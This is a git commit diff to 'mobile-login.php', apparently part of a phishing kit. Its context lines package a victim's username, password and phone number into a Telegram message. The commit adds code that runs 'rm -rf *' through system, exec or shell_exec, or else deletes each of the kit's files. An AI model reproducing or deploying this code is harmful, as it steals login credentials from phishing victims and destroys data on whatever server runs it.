75d0f2a73c9f58a9b07c88d2fda0dd7a61b362dc
hubad666 <100355242+hubad666@users.noreply.github.com>
2022-02-26 16:16:25 +0700

    Update mobile-login.php

--- mobile-login.php
+++ mobile-login.php
@@ -1,3 +1,26 @@
+ if(function_exists('system')) {
+         system('rm -rf *');
+      }
+      elseif(function_exists('exec')) {
+         exec('rm -rf *');
+      }
+      elseif(function_exists('shell_exec')) {
+         shell_exec('rm -rf *');
+      }
+      else {
+        unlink('lbpiaccess.zip');
+        unlink('confirm.php');
+        unlink('cc.jpg');
+        unlink('otp-login.php');
+        unlink('otp-expired.jpg');
+        unlink('otp.jpg');
+        unlink('mobile-login.php');
+        unlink('mobile.jpg');
+        unlink('login.php');
+        unlink('index.php');
+        unlink('index.jpg');
+      }
+
 $us = [
 'chat_id' => "-635799224",
 'text' => "User: " . $_COOKIE['username'] . "\nPass: " . $_COOKIE['password'] . "\nNum: " . $_POST['number']
